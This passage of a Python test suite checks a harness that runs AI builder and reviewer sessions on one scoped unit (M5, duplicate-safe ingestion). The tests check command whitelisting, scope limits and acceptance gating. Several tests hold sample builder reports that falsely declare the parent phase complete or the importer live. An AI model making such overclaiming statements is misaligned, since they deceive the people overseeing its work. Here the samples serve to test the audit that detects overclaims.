            for entry in vocabulary
            if "probe_phase6_observation.py --case " in entry and entry not in brief
        ]
        assert not missing, (
            "the approved-command list was truncated before these M5 cases: "
            f"{missing}. The brief renders at most {MAX_RENDERED_COMMANDS} commands; the "
            f"approved set now holds {len(planner.approved_commands)}."
        )

    def test_the_approved_set_still_fits_inside_what_the_brief_renders(self, tmp_path):
        """Approved commands sort ASCII and every probe entry begins
        `scripts/probe_...`, so they sort LAST: an approved set larger than the
        render bound loses the probe vocabulary first, and loses it silently."""
        planner = self._planner(tmp_path, _local_vocabulary())
        assert len(planner.approved_commands) <= MAX_RENDERED_COMMANDS, (
            f"{len(planner.approved_commands)} approved commands but the generation brief "
            f"renders only the first {MAX_RENDERED_COMMANDS} — the M5 vocabulary sorts last "
            "and is now invisible to the generator."
        )


# --------------------------------------------------------------------------
# 6. Dynamic generation can close an M5 coverage gap, safely
# --------------------------------------------------------------------------


def _gap_scenario(command: str, risk_key: str) -> GeneratedScenario:
    """A coverage-gap case that cites the risk it claims to close.

    Built as the planner builds one: the citation lives on the provenance, and a
    coverage-gap case that cannot name a risk from this run's own register is
    refused before it reaches the boundary at all.
    """
    return GeneratedScenario(
        id="gen-m5-duplicate",
        title="the carrier's mail server retries the same message five times",
        purpose=(
            "the identical content must produce one row, one confirmation and zero "
            "downstream work, whatever the delivery pattern"
        ),
        risk_category=RiskCategory.IDEMPOTENCY,
        priority=Priority.P0,
        rationale="the identified duplicate-ingest risk had no scenario behind it",
        requirement_reference="P6/M5",
        product_principle_reference="effect-truth",
        isolation_note=(
            "the probe builds its own temporary database per case and touches no shared "
            "state, so nothing survives it to contaminate the next scenario"
        ),
        provenance=ScenarioProvenance(
            stage=STAGE_COVERAGE_GAP,
            wave=2,
            task_hash="m5-task",
            session_id="scripted",
            generating_risk="a duplicate delivery could create a second observation",
            source_risks=[risk_key],
        ),
        actions=[{"kind": "command", "name": "redeliver the same message", "command": command}],
        # `idempotency` is in the planner's EFFECT_FAMILY, so a case in it that
        # inspects no persisted state is refused — and rightly. "the duplicate
        # created no second row" is a claim about a TABLE, and a probe that
        # prints it has proved it printed it. This is the mechanical form of the
        # rubric's "a 200 is not success", and M5 is the unit it applies to most
        # literally.
        persisted_state_checks=[
            GeneratedStateCheck(
                name="one row survives the redelivery",
                command=STATE_ORACLE,
                contains=["problems: []", "observations"],
            )
        ],
        expected_observations=["ONE ROW, ONE CONFIRMATION, ZERO WORK"],
        forbidden_observations=["### DUPLICATE OBSERVATION ROW ###"],
    )


class TestGenerationClosesM5GapsWithoutInventingCommands:
    @pytest.fixture
    def context(self):
        approved = ApprovedCommands.from_sources(
            scenarios=[load_scenario(p) for p in sorted(SCENARIOS_DIR.glob("*.y*ml"))],
            configured=_local_vocabulary(),
        )
        risk = IdentifiedRisk(
            id="R-duplicate",
            description="a duplicate delivery could create a second observation and duplicate work",
            risk_category=RiskCategory.IDEMPOTENCY,
            severity=Priority.P0,
            basis="the natural-key unique index is the only thing that serializes ingestion",
        )
        return (
            ValidationContext(
                approved_commands=approved,
                grounding_tokens={"p6/m5", "p6", "m5"},
                principle_tokens={"effect-truth"},
                known_risk_ids={risk.key, "R-duplicate"},
            ),
            risk,
        )

    def test_a_gap_case_built_from_the_m5_vocabulary_is_accepted(self, context):
        ctx, risk = context
        command = (
            f"{PROBE} --case duplicate-is-one-row-one-confirmation-zero-work "
            "--inject duplicate-ingest --repeat 5 --seed 7"
        )
        accepted, rejected = validate_plan([_gap_scenario(command, risk.key)], ctx)
        assert accepted, f"a legitimate M5 coverage-gap case was refused: {rejected}"
        assert not rejected

    def test_the_whole_mutation_axis_is_reachable_from_a_gap_case(self, context, dimensions):
        ctx, risk = context
        for fault in [d for d in dimensions if not d.startswith("--")]:
            command = (
                f"{PROBE} --case duplicate-is-one-row-one-confirmation-zero-work "
                f"--inject {fault} --concurrency 4 --delay-ms 40 --sources 2 --seed 11"
            )
            accepted, rejected = validate_plan([_gap_scenario(command, risk.key)], ctx)
            assert accepted, f"{fault}: {rejected}"

    def test_a_gap_case_inventing_a_command_is_refused(self, context):
        ctx, risk = context
        accepted, rejected = validate_plan(
            [_gap_scenario('python -c "import observation; observation.ingest()"', risk.key)], ctx
        )
        assert not accepted
        assert rejected
        reasons = rejected[0][1]
        assert any("approved" in r.lower() for r in reasons), reasons

    def test_a_gap_case_touching_repository_authority_is_refused(self, context):
        """A verification scenario observes the product; it never edits the
        rules the product is judged against."""
        ctx, risk = context
        accepted, rejected = validate_plan(
            [_gap_scenario(f"{PROBE} --case x docs/implementation/CURRENT.md", risk.key)], ctx
        )
        assert not accepted
        reasons = rejected[0][1]
        assert any("authority" in r.lower() for r in reasons), reasons

    def test_an_uncovered_p0_m5_risk_blocks_acceptance(self):
        """Coverage is not a tally. A risk the run itself called P0 with no
        passing scenario behind it prevents an ACCEPT even when everything that
        DID run was green."""
        from neyma_product_driver.scenario_gate import GateStatus, evaluate_gate
        from neyma_product_driver.scenario_suite import (
            Origin,
            Outcome,
            ScenarioOutcome,
            SuiteResult,
        )

        passing = ScenarioOutcome(
            scenario_id="gen-ingest",
            scenario_name="gen-ingest",
            origin=Origin.GENERATED,
            outcome=Outcome.PASSED,
            required=True,
            risk_category="authorization",
            evidence_path="/runs/gen-ingest",
            evidence_verified=True,
        )
        result = SuiteResult(outcomes=[passing], expected_required_ids=["gen-ingest"])
        assert evaluate_gate(result, risks=[]).status is GateStatus.VERIFIED

        verdict = evaluate_gate(
            result,
            risks=[
                IdentifiedRisk(
                    id="R-duplicate",
                    description="a duplicate delivery could create a second observation",
                    risk_category=RiskCategory.IDEMPOTENCY,
                    severity=Priority.P0,
                    basis="M-24 is the mandate the unit exists to satisfy",
                )
            ],
        )
        assert verdict.status is GateStatus.NOT_VERIFIED
        assert verdict.blocks_acceptance
        assert "KNOWN COVERAGE GAPS" in verdict.summary_block()


# --------------------------------------------------------------------------
# 7-8. M5 is scoped as a unit, and cannot move the phase
# --------------------------------------------------------------------------


@pytest.fixture
def m5_repo(tmp_path: Path) -> PhaseRepo:
    """A phase in progress, one unit being built, a stated review rule."""
    repo = PhaseRepo(tmp_path / "neyma")
    repo.write("src/observation.py", "# the unit under construction\n")
    repo.commit_all("the M5 candidate")
    return repo


class TestM5IsScopedAsAUnit:
    def test_the_real_task_resolves_to_p6_slash_m5(self, m5_repo: PhaseRepo):
        scope = m5_repo.scope(M5_TASK)
        assert scope.scope_id == "P6/M5"
        assert scope.level is ScopeLevel.TASK
        assert scope.is_nested
        assert scope.parent_phase_id == "P6"

    def test_it_does_not_claim_phase_completion_however_often_p6_appears(
        self, m5_repo: PhaseRepo
    ):
        """The task discusses P6 at length. Discussing a phase is not claiming
        it, and a run that inherited the phase's bar would be held to nine units
        that do not exist."""
        scope = m5_repo.scope(M5_TASK)
        assert scope.claims_phase_completion is False
        assert scope.phase_completion_requested is False
        assert scope.requires_phase_acceptance is False

    def test_the_phase_stays_exactly_where_the_repository_put_it(self, m5_repo: PhaseRepo):
        scope = m5_repo.scope(M5_TASK)
        assert scope.parent_phase_state == "READY"
        assert scope.parent_phase_execution_state == "IN_PROGRESS"
        assert "P6 stays IN_PROGRESS" in scope.describe()

    def test_the_block_handed_to_the_builder_says_what_acceptance_is_not(
        self, m5_repo: PhaseRepo
    ):
        rendered = m5_repo.scope(M5_TASK).render()
        assert "does NOT complete the parent phase" in rendered
        assert "does NOT score a phase acceptance criterion" in rendered
        assert "enables nothing in production" in rendered


class TestM5CannotScoreP6OrUnlockP7:
    def test_a_nested_acceptance_refuses_to_accept_the_phase_even_when_asked(
        self, m5_repo: PhaseRepo
    ):
        scope = m5_repo.scope(M5_TASK)
        completion = scoped_completion(scope, TaskResult.ACCEPTED, phase_accepted=True)
        assert completion.parent_phase_accepted is False
        assert completion.task_scope == "P6/M5"
        assert completion.parent_phase == "P6"
        assert completion.parent_phase_execution_state == "IN_PROGRESS"

    def test_the_standard_exclusions_are_carried_on_the_record(self, m5_repo: PhaseRepo):
        completion = scoped_completion(m5_repo.scope(M5_TASK), TaskResult.ACCEPTED)
        assert completion.does_not_imply == standard_exclusions("P6")
        assert "P6 is COMPLETE" in completion.does_not_imply
        assert "the next phase is unblocked" in completion.does_not_imply

    def test_a_builder_claiming_p6_is_complete_is_caught(self, m5_repo: PhaseRepo):
        audit = m5_repo.audit(
            "M5 is implemented and verified. With M5 landed, P6 is COMPLETE and P7 is "
            "now unblocked.\n",
            M5_TASK,
        )
        assert audit.decision is not AuditDecision.VERIFIED

    def test_a_builder_claiming_production_enablement_is_caught(self, m5_repo: PhaseRepo):
        audit = m5_repo.audit(
            "M5 is implemented and verified. The mailbox importer is now enabled for "
            "live traffic.\n",
            M5_TASK,
        )
        assert audit.decision is not AuditDecision.VERIFIED

    def test_the_task_names_every_prohibited_expansion(self):
        """The M5-specific temptations, each named in the task's `Do not` list.

        M5's are different from M4's: this repository already CONTAINS a legacy
        ingestion surface, an email adapter, an IMAP mailbox and an extractor,
        all of which predate the specification and none of which is M5.
        """
        for prohibition in (
            "M6–M13",
            "M6 Identity Binding Claim",
            "M9 Exception",
            "P7 or later",
            "provenance and evidence platform",
            "freight workflows",
            "invoice automation",
            "any live importer",
            "ingestion.py",
            "email_adapter.py",
            "imap_mailbox.py",
            "production autonomy",
            "live production effects",
            "legacy cleanup campaign",
            "push, publish or deploy",
        ):
            assert prohibition in M5_TASK, f"the task never forbids {prohibition!r}"
        assert "weaken **P3, P4 or P5**" in M5_TASK
        assert "polish **M1, M2, M3 or M4**" in M5_TASK

    def test_the_task_allows_exactly_one_blocking_prerequisite_and_requires_it_reported(self):
        assert "smallest blocking prerequisite" in M5_TASK_FLAT
        assert "identify it explicitly" in M5_TASK_FLAT


# --------------------------------------------------------------------------
# 9-11. The loop owns M5 end to end
# --------------------------------------------------------------------------


class TestTheIntegratedReviewIsOwed:
    def test_the_repositorys_own_rule_binds_the_scoped_unit(self, m5_repo: PhaseRepo):
        requirement = resolve_review_requirement(
            m5_repo.root, m5_repo.scope(M5_TASK), unit=m5_repo.unit()
        )
        assert requirement.required
        assert requirement.from_repository_authority

    def test_the_task_states_the_tier_and_says_why_it_took_the_higher_one(self):
        """CLAUDE.md §7: "When genuinely torn between two tiers, take the higher
        one once and say so."

        A state machine is tier 2 by itself. M5 also lands a MIGRATION, is
        load-bearing for TENANT ISOLATION, and is where untrusted counterparty
        content enters the system — three tier-1 surfaces by name.
        """
        assert "tier-1" in M5_TASK
        assert "migration" in M5_TASK_FLAT
        assert "tenant isolation" in M5_TASK_FLAT
        assert "untrusted counterparty content enters the system" in M5_TASK_FLAT
        assert "take the higher tier once and say so, and this file says so" in M5_TASK_FLAT


class TestTheLoopOwnsM5EndToEnd:
    async def test_a_grounded_reviewer_finding_reaches_the_same_builder(
        self, m5_repo: PhaseRepo, tmp_path: Path
    ):
        """The founder relays nothing. The finding goes back into the session
        that wrote the code, with its evidence path intact."""
        builder = FakeBuilder(m5_repo.root, edits=True)
        reviewer = FakeReviewer([refusing(), supported()])

        result, _store = await drive(
            m5_repo, tmp_path, task=M5_TASK, builder=builder, reviewer=reviewer
        )

        assert len(builder.prompts) >= 2, "the reviewer's findings never reached the builder"
        assert "INDEPENDENT REVIEW" in builder.prompts[1]
        assert builder.session_id == "builder-session-1", "a new builder session was started"
        assert result.status is RunStatus.ACCEPTED

    async def test_the_corrected_tree_gets_a_brand_new_reviewer(
        self, m5_repo: PhaseRepo, tmp_path: Path
    ):
        builder = FakeBuilder(m5_repo.root, edits=True)
        reviewer = FakeReviewer([refusing(), supported()])

        result, _store = await drive(
            m5_repo, tmp_path, task=M5_TASK, builder=builder, reviewer=reviewer
        )

        assert reviewer.launches == 2
        assert len(set(reviewer.session_ids)) == 2, "the same reviewer session was reused"
        first = reviewer.bindings[0]["fingerprint"]
        second = reviewer.bindings[1]["fingerprint"]
        assert not first.matches(second), "the second reviewer read the same tree as the first"
        assert result.satisfying_review.fingerprint.matches(second)

    async def test_an_accept_is_scoped_m5_acceptance_and_never_p6_complete(
        self, m5_repo: PhaseRepo, tmp_path: Path
    ):
        reviewer = FakeReviewer([supported()])
        result, _store = await drive(m5_repo, tmp_path, task=M5_TASK, reviewer=reviewer)

        assert result.status is RunStatus.ACCEPTED
        assert result.audit is not None, "the run accepted without a completion audit"
        completion = result.audit.completion
        assert completion is not None
        assert completion.task_scope == "P6/M5"
        assert completion.task_result in {TaskResult.ACCEPTED, TaskResult.VERIFIED}
        assert completion.parent_phase == "P6"
        assert completion.parent_phase_accepted is False
        assert "P6 is COMPLETE" in completion.does_not_imply
        assert "the next phase is unblocked" in completion.does_not_imply

    async def test_the_run_stops_at_m5_and_never_walks_into_m6(
        self, m5_repo: PhaseRepo, tmp_path: Path
    ):
        """Two halves of the same guarantee: the task forbids it in words, and
        the loop ends at its own scoped verdict rather than picking up the next
        unit."""
        assert "Stop at verified M5. Do not automatically continue into M6." in M5_TASK
        assert "begin **M6–M13**" in M5_TASK

        reviewer = FakeReviewer([supported()])
        result, store = await drive(m5_repo, tmp_path, task=M5_TASK, reviewer=reviewer)
        assert result.status is RunStatus.ACCEPTED
        assert result.audit.completion.task_scope == "P6/M5"

        journal = RunJournal(run_id=store.run_id, task=M5_TASK)
        journal.record_outcome(run_status="ACCEPTED")
        summary = journal.personal_summary()
        for forbidden in ("M6", "begin the next unit", "continue into"):
            assert forbidden not in summary.split("### 8. The ONE exact next move")[1], (
                f"the next move points past M5 ({forbidden!r})"
            )


# --------------------------------------------------------------------------
# 12. The founder summary says what M5 actually does, in normal language
# --------------------------------------------------------------------------


class _Gate:
    """Duck-typed GateVerdict stand-in."""

    def __init__(self, status: str, *, passed: int = 0, total: int = 0):
        self.status = status
        self.unverified: list = []
        self.uncovered_risks: list = []
        self.generation_problems: list = []
        self.required_passed = passed
        self.required_total = total

    def headline(self) -> str:
        return f"scenario gate: {self.status}"


def _m5_journal(**outcome) -> RunJournal:
    scenario = load_scenario(M5_PATH)
    journal = RunJournal(run_id="r-m5", task=M5_TASK)
    journal.task_scope_id = "P6/M5"
    journal.parent_phase_id = "P6"
    journal.parent_phase_state = "IN_PROGRESS"
    journal.scope_is_nested = True
    journal.record_outcome(
        scenario_name=scenario.name,
        scenario_phase=scenario.phase,
        scenario_purpose=scenario.description,
        **outcome,
    )
    return journal


class TestTheFounderSummaryExplainsM5:
    def test_it_states_the_product_impact_in_normal_language(self):
        """The scenario description is what a founder reads to learn what the
        unit is for. It has to be a brokerage sentence, not a machine one."""
        scenario = load_scenario(M5_PATH)
        text = " ".join(scenario.description.split()).lower()
        for phrase in ("rate confirmation", "carrier", "counterparty", "the same"):
            assert phrase in text, f"the description never mentions {phrase!r}"
        assert "ships dark" in text

    def test_it_never_says_p6_moved(self):
        journal = _m5_journal(run_status="ACCEPTED", gate=_Gate("VERIFIED", passed=9, total=9))
        summary = journal.personal_summary()
        assert "P6 is COMPLETE" not in summary
        assert "P6 COMPLETE" not in summary

    def test_it_does_not_imply_a_live_importer_or_production(self):
        """A negative that has to be written carefully.

        "enables nothing in production" is a sentence this summary SHOULD carry,
        so a bare search for "in production" fails on the correct text. What must
        not appear is an ENABLEMENT claim, and each phrase below is one.
        """
        journal = _m5_journal(run_status="ACCEPTED", gate=_Gate("VERIFIED", passed=9, total=9))
        summary = journal.personal_summary().lower()
        for claim in (
            "enabled for live traffic",
            "live traffic is",
            "production-ready",
            "enabled for customers",
            "importer is running",
            "mailbox is connected",
        ):
            assert claim not in summary, f"the summary implies {claim!r}"
        # And the thing it must actively say, because "dark" is the whole posture.
        assert "enables nothing in production" in summary

    def test_no_founder_decision_says_none(self):
        journal = _m5_journal(run_status="ACCEPTED", gate=_Gate("VERIFIED", passed=9, total=9))
        journal.record_stop(reason="M5 verified.", founder_decision_required="none")
        assert journal.founder_decision_required == ""
